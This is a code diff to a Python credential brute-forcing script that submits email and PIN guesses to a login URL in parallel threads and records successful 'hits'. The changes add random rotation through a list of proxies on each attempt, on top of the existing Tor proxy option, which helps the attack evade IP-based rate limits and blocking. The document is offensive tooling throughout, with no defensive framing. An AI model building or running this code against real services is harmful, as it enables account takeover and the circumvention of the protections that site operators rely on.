@@ -3,8 +3,10 @@ import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import itertools
 import argparse
+import random
 import time
 import threading
+import os
 
 attempts = 0
 attempts_lock = threading.Lock()
@@ -54,7 +56,8 @@ def main():
     parser.add_argument("--verbose", action="store_true", help="Enable status updates during brute force")
     parser.add_argument("--email-param", type=str, default="email", help="Parameter name for email")
     parser.add_argument("--pin-param", type=str, default="pin", help="Parameter name for PIN")
-    parser.add_argument("--proxy", type=str, help="Proxy URL (e.g., http://127.0.0.1:9050 for Tor)")
+    parser.add_argument("--proxy", type=str, help="Single proxy URL (http:// or socks5h://)")
+    parser.add_argument("--proxy-list", type=str, help="File containing list of proxy URLs to rotate")
     
     args = parser.parse_args()
 
@@ -69,11 +72,20 @@ def main():
     print(f"[*] Proxy: {args.proxy}")
 
     proxies = None
+    proxy_list = []
+
     if args.proxy:
         proxies = {
             "http": args.proxy,
             "https": args.proxy
         }
+
+    elif args.proxy_list:
+        with open(args.proxy_list, 'r') as f:
+            proxy_list = [line.strip() for line in f if line.strip()]
+        if not proxy_list:
+            raise ValueError("Proxy list is empty or invalid")
+
 
     if args.email:
         emails = [args.email]
@@ -87,9 +99,16 @@ def main():
         futures = []
         for email in emails:
             for pin in generate_pins(args.min_digits, args.max_digits, args.charset):
+                # Select proxy randomly per attempt
+                chosen_proxy = random.choice(proxy_list) if proxy_list else args.proxy
+                chosen_proxies = {
+                    "http": chosen_proxy,
+                    "https": chosen_proxy
+                } if chosen_proxy else None
+
                 futures.append(executor.submit(
                     attack, args.url, email, pin, args.delay, args.verbose,
-                    args.email_param, args.pin_param, proxies
+                    args.email_param, args.pin_param, chosen_proxies
                 ))
 
         for _ in as_completed(futures):
@@ -98,4 +117,10 @@ def main():
 if __name__ == '__main__':
     main()
     print(f"[*] Total attempts: {attempts}")
-    print(f"[*] Total hits: {len(open('hits.txt', 'r').readlines())}")
+
+    if os.path.exists("hits.txt"):
+        with open("hits.txt", "r") as f:
+            hits_count = len(f.readlines())
+        print(f"[*] Total hits: {hits_count}")
+    else:
+        print("[*] Total hits: 0")
